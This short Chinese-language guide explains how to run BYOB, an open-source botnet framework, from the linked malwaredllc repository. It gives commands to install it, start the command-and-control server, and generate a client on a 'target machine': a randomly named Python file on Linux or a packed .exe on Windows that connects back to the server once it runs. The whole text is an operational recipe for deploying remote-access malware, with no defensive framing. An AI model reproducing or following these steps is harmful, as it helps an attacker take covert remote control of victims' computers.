**1、安装环境(根目录下执行)：**

```
	python setup.py install
```



**2、先运行server.py：**

```
python server.py --host <YOUR-SERVER-IP> --port <DESIRED-PORT>
```



**3、目标机上运行client.py，假定server的IP地址为127.0.0.1，端口为33306****

**对于linux目标机：**

```
python client.py 127.0.0.1 33306
```

这将在根目录下生成一个随机命名的python文件，假定为byob_wRV.py，运行这个文件

```
python byob_wRV.py
```

一旦运行，server端便能接受到

**对于windows目标机：**

```
python client.py 127.0.0.1 33306 --freeze
```

这将产生一个随机命名的.exe文件，在dist目录中，双击便可运行

一旦运行，server端便能接受到



源码地址： https://github.com/malwaredllc/byob 